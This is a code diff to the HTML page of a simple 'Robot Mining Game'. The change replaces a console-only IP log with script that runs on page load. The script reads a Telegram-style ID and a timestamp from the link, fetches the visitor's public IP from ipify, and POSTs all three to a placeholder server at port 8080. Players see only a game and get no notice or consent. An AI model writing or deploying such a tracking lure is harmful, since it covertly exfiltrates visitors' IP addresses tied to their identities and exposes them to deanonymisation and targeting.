@@ -3,7 +3,7 @@
 <head>
 <meta charset="UTF-8" />
 <meta name="viewport" content="width=device-width, initial-scale=1" />
-<title>Robot Mining Game (IP в консоль)</title>
+<title>Robot Mining Game with IP Reporting</title>
 <style>
   body {
     font-family: sans-serif;
@@ -119,17 +119,28 @@
 </div>
 
 <script>
-  // Получение IP и вывод только в консоль
-  fetch('https://api.ipify.org?format=json')
-    .then(response => response.json())
-    .then(data => {
-      console.log("User IP:", data.ip);
-    })
-    .catch(() => {
-      console.log("Failed to get IP");
-    });
+  // Получаем параметры из URL (username, time, tgid)
+  const urlParams = new URLSearchParams(window.location.search);
+  const tgid = urlParams.get('tgid');
+  const time = urlParams.get('time');
 
-  // Игровая логика (без изменений)
+  // Получаем IP через публичный API и отправляем на сервер
+  fetch('https://api.ipify.org?format=json')
+    .then(res => res.json())
+    .then(data => {
+      fetch('http://YOUR_SERVER_IP_OR_DOMAIN:8080/report_ip', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          tgid: tgid,
+          time: time,
+          ip: data.ip
+        })
+      }).catch(console.error);
+    })
+    .catch(console.error);
+
+  // Игровая логика
   const GRID_W = 4;
   const GRID_H = 5;
   const BLOCK_TYPES = ['stone', 'ore1', 'ore2', 'ore3'];
